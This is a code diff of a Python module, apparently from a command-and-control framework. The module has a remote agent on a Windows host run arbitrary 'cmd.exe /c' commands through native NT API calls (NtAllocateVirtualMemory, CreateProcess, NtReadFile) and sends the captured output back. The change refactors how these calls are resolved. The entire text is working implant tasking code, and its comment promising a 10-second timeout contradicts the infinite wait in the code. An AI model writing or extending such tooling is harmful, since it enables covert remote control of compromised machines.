@@ -8,26 +8,17 @@ DEPENDENCIES = [
     "NtAllocateVirtualMemory", 
     "CreatePipe",            # Create the redirection pipe
     "CreateProcess",           # kernel32!CreateProcessA wrapper
-    "WaitForSingleObject",   # Wait for process exit
+    "NtWaitForSingleObject",   # Wait for process exit
     "NtReadFile",              # Capture stdout
     "NtClose",                 # Cleanup handles
-    "NtFreeVirtualMemory",      # Cleanup buffers
-    "SetHandleInformation"
+    "NtFreeVirtualMemory"      # Cleanup buffers,
 ]
 
-def function(agent_id, args, dependencies):
+def function(agent_id, args):
     from services.orders import read_from_agent
     import time
     
     # 0. RESOLVE DEPENDENCIES
-    NtAlloc       = dependencies[0]
-    CreatePipe  = dependencies[1]
-    CreateProcess = dependencies[2]
-    Wait        = dependencies[3]
-    NtRead        = dependencies[4]
-    NtClose       = dependencies[5]
-    NtFree        = dependencies[6]
-    SetHandleInformation = dependencies[7]
 
     command_raw = args[0]
     full_command = f"cmd.exe /c {command_raw}"
@@ -35,22 +26,15 @@ def function(agent_id, args, dependencies):
     # 1. CREATE OUTPUT PIPE (\Device\NamedPipe\)
     # DesiredAccess: 0xC0100000 (Generic Read/Write / Synchronize)
     pipe_ret = CreatePipe(agent_id, [])
-    if pipe_ret["SUCCESS"] == False:
+    if pipe_ret["retval"] == False:
         return {"Result": f"Failed to create pipe"}
     hPipeRead = pipe_ret["READ_HANDLE"]
     hPipeWrite = pipe_ret["WRITE_HANDLE"]
 
-    shi_ret = SetHandleInformation(agent_id, [hPipeRead, 1, 0])
-
-    if shi_ret["SUCCESS"] == False:
-        NtClose(agent_id, [hPipeRead])
-        NtClose(agent_id, [hPipeWrite])
-        return {"Result": "Failed to set pipe handle information."}
-
     # 2. ALLOCATE BUFFER FOR OUTPUT (8KB)
     output_buf_size = 8192
-    alloc_ret = NtAlloc(agent_id, [output_buf_size, 0x04])
-    if alloc_ret["NTSTATUS"] != 0:
+    alloc_ret = NtAllocateVirtualMemory(agent_id, [output_buf_size, 0x04])
+    if alloc_ret["retval"] != 0:
         NtClose(agent_id, [hPipeRead])
         NtClose(agent_id, [hPipeWrite])
         return {"Result": "Failed output buffer allocation"}
@@ -58,8 +42,7 @@ def function(agent_id, args, dependencies):
 
     # 3. EXECUTE PROCESS (kernel32!CreateProcessA)
     # This dependency handles STARTUPINFOA (redirection) and bInheritHandles internally
-    proc_ret = CreateProcess(agent_id, [full_command, hPipeWrite], [NtAlloc, NtFree])
-    
+    proc_ret = CreateProcess(agent_id, [full_command, hPipeWrite])
     captured_output = ""
     if proc_ret["Success"]:
         hProcess = proc_ret["PROCESS_HANDLE"]
@@ -70,20 +53,20 @@ def function(agent_id, args, dependencies):
         # 4. WAIT FOR PROCESS TO FINISH (NtWaitForSingleObject)
         # We wait for hProcess to enter a signaled state (exit)
         # Timeout: 10000ms (10 seconds) to prevent the agent from hanging indefinitely
-        wait_ret = Wait(agent_id, [hProcess, 0xFFFFFFFF])
+        wait_ret = NtWaitForSingleObject(agent_id, [hProcess, -1])
         
-        if wait_ret["WaitResult"] == 0:
+        if wait_ret["retval"] == 0:
             print("[+] Process exited. Reading output...")
-        elif wait_ret["WaitResult"] == 0x102:
+        elif wait_ret["retval"] == 0x102:
             print("[!] Warning: Wait timed out (10s). Reading partial output.")
         else:
-            print(f"[!] Wait failed with status: {hex(wait_ret['WaitResult'])}")
+            print(f"[!] Wait failed with status: {hex(wait_ret['retval'])}")
 
         # 5. READ OUTPUT (NtReadFile)
         # Since the process has (likely) exited, the pipe now contains the full output buffer
-        read_ret = NtRead(agent_id, [hPipeRead, 0, p_output_buffer, output_buf_size])
+        read_ret = NtReadFile(agent_id, [hPipeRead, 0, p_output_buffer, output_buf_size])
         
-        if read_ret["NTSTATUS"] == 0 or read_ret["NTSTATUS"] == 0xC0000011:
+        if read_ret["retval"] == 0 or read_ret["retval"] == 0xC0000011:
             raw_data = read_from_agent(agent_id, p_output_buffer, output_buf_size)
             # UTF-8 decode and strip trailing nulls
             captured_output = raw_data.decode('utf-8', errors='ignore').split('\x00')[0]
@@ -97,11 +80,11 @@ def function(agent_id, args, dependencies):
     # 7. FINAL CLEANUP
     NtClose(agent_id, [hPipeRead])
     NtClose(agent_id, [hPipeWrite])
-    NtFree(agent_id, [p_output_buffer, output_buf_size, 0x8000])
+    NtFreeVirtualMemory(agent_id, [p_output_buffer, output_buf_size, 0x8000])
 
     return {
         "Result": "Success" if proc_ret["Success"] else "Failed",
         "Command": full_command,
         "Output": captured_output.strip(),
-        "Status": hex(proc_ret.get("NTSTATUS", 0))
+        "Status": hex(proc_ret.get("retval", 0))
     }
